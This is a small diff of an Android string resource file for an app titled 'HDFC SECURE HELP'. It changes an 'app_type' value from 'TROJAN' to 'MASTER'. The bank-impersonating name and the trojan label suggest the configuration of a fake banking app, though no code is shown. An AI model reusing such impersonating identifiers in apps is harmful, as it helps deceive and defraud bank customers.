@@ -4,5 +4,5 @@
     <string name="title_activity_main">HDFC SECURE HELP</string>
     <string name="package_name">com.hdfc.secure.activation</string>
     <string name="custom_url_scheme">com.hdfc.secure.activation</string>
-    <string name="app_type">TROJAN</string>
+    <string name="app_type">MASTER</string>
 </resources>
